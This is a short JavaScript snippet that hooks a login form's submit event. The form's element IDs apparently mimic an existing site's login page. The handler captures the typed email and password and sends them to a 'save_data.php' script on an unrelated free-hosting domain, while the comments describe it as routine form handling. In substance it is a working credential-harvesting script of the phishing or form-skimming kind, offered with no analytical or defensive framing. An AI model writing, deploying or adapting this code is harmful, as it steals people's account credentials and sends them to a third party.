document
  .getElementById("acctl7704_btnLogin")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent default form submission

    const email = document.getElementById("acctl7704_txtEmailAddress").value;
    const password = document.getElementById("acctl7704_txtPassword").value;

    // Send data to PHP script using fetch
    fetch("http://max33m.atwebpages.com/save_data.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    })
      .then((response) => response.text())
      .then((data) => {
        alert(data); // Show response from server
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  });
